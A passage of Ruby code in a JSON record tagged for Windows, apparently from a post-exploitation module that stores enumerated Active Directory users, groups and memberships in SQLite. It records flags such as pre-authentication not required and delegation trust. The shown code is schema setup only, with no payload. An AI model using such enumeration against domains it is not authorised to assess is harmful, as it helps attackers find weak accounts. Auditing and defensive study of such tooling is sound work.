'g_SAM_DOMAIN_OBJECT INTEGER,'\\\n                         'g_SAM_GROUP_OBJECT INTEGER,'\\\n                         'g_SAM_NON_SECURITY_GROUP_OBJECT INTEGER,'\\\n                         'g_SAM_ALIAS_OBJECT INTEGER,'\\\n                         'g_SAM_NON_SECURITY_ALIAS_OBJECT INTEGER,'\\\n                         'g_SAM_NORMAL_USER_ACCOUNT INTEGER,'\\\n                         'g_SAM_MACHINE_ACCOUNT INTEGER,'\\\n                         'g_SAM_TRUST_ACCOUNT INTEGER,'\\\n                         'g_SAM_APP_BASIC_GROUP INTEGER,'\\\n                         'g_SAM_APP_QUERY_GROUP INTEGER,'\\\n                         'g_SAM_ACCOUNT_TYPE_MAX INTEGER)'\n    db.execute(sql_table_group)\n\n    # Create the table for the AD Users\n    db.execute('DROP TABLE IF EXISTS ad_users')\n    sql_table_users = 'CREATE TABLE ad_users ('\\\n                         'u_rid INTEGER PRIMARY KEY NOT NULL,'\\\n                         'u_distinguishedName TEXT UNIQUE NOT NULL,'\\\n                         'u_description TEXT,'\\\n                         'u_displayName TEXT,'\\\n                         'u_sAMAccountType INTEGER,'\\\n                         'u_sAMAccountName TEXT,'\\\n                         'u_logonCount INTEGER,'\\\n                         'u_userAccountControl INTEGER,'\\\n                         'u_primaryGroupID INTEGER,'\\\n                         'u_cn TEXT,'\\\n                         'u_adminCount INTEGER,'\\\n                         'u_badPwdCount INTEGER,'\\\n                         'u_userPrincipalName TEXT UNIQUE,'\\\n                         'u_comment TEXT,'\\\n                         'u_title TEXT,'\\\n                         'u_manager TEXT,'\\\n                         'u_whenCreated TEXT,'\\\n                         'u_whenChanged TEXT,'\\\n                         'u_ADS_UF_SCRIPT INTEGER,'\\\n                         'u_ADS_UF_ACCOUNTDISABLE INTEGER,'\\\n                         'u_ADS_UF_HOMEDIR_REQUIRED INTEGER,'\\\n                         'u_ADS_UF_LOCKOUT INTEGER,'\\\n                         'u_ADS_UF_PASSWD_NOTREQD INTEGER,'\\\n                         'u_ADS_UF_PASSWD_CANT_CHANGE INTEGER,'\\\n                         'u_ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED INTEGER,'\\\n                         'u_ADS_UF_TEMP_DUPLICATE_ACCOUNT INTEGER,'\\\n                         'u_ADS_UF_NORMAL_ACCOUNT INTEGER,'\\\n                         'u_ADS_UF_INTERDOMAIN_TRUST_ACCOUNT INTEGER,'\\\n                         'u_ADS_UF_WORKSTATION_TRUST_ACCOUNT INTEGER,'\\\n                         'u_ADS_UF_SERVER_TRUST_ACCOUNT INTEGER,'\\\n                         'u_ADS_UF_DONT_EXPIRE_PASSWD INTEGER,'\\\n                         'u_ADS_UF_MNS_LOGON_ACCOUNT INTEGER,'\\\n                         'u_ADS_UF_SMARTCARD_REQUIRED INTEGER,'\\\n                         'u_ADS_UF_TRUSTED_FOR_DELEGATION INTEGER,'\\\n                         'u_ADS_UF_NOT_DELEGATED INTEGER,'\\\n                         'u_ADS_UF_USE_DES_KEY_ONLY INTEGER,'\\\n                         'u_ADS_UF_DONT_REQUIRE_PREAUTH INTEGER,'\\\n                         'u_ADS_UF_PASSWORD_EXPIRED INTEGER,'\\\n                         'u_ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION INTEGER,'\\\n                         'u_SAM_DOMAIN_OBJECT INTEGER,'\\\n                         'u_SAM_GROUP_OBJECT INTEGER,'\\\n                         'u_SAM_NON_SECURITY_GROUP_OBJECT INTEGER,'\\\n                         'u_SAM_ALIAS_OBJECT INTEGER,'\\\n                         'u_SAM_NON_SECURITY_ALIAS_OBJECT INTEGER,'\\\n                         'u_SAM_NORMAL_USER_ACCOUNT INTEGER,'\\\n                         'u_SAM_MACHINE_ACCOUNT INTEGER,'\\\n                         'u_SAM_TRUST_ACCOUNT INTEGER,'\\\n                         'u_SAM_APP_BASIC_GROUP INTEGER,'\\\n                         'u_SAM_APP_QUERY_GROUP INTEGER,'\\\n                         'u_SAM_ACCOUNT_TYPE_MAX INTEGER)'\n    db.execute(sql_table_users)\n\n    # Create the table for the mapping between the two (membership)\n    db.execute('DROP TABLE IF EXISTS ad_mapping')\n    sql_table_mapping = 'CREATE TABLE ad_mapping ('\\\n                         'user_rid INTEGER NOT NULL,' \\\n                         'group_rid INTEGER NOT NULL,'\\\n                         'PRIMARY KEY (user_rid, group_rid),'\\\n                         'FOREIGN KEY(user_rid) REFERENCES ad_users(u_rid)'\\\n                         'FOREIGN KEY(group_rid) REFERENCES ad_groups(g_rid))'\n    db.execute(sql_table_mapping)\n\n    # Create the view for the AD User/Group membership\n    db.execute('DROP VIEW IF EXISTS view_mapping')\n    sql_view_mapping = 'CREATE VIEW view_mapping AS SELECT ad_groups.*,ad_users.* FROM ad_mapping '\\\n                       'INNER JOIN ad_groups ON ad_groups.g_rid = ad_mapping.group_rid '\\\n                       'INNER JOIN ad_users ON ad_users.u_rid = ad_mapping.user_rid'\n    db.execute(sql_view_mapping)\n\n    return db, dbfile\n  rescue SQLite3::Exception => e\n    print_error(\"Error(Database): #{e.message}\")\n    return\n  end\n\n  def get_rid(data)\n    sid = data.unpack('bbbbbbbbV*')[8..]\n    sid[-1]\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}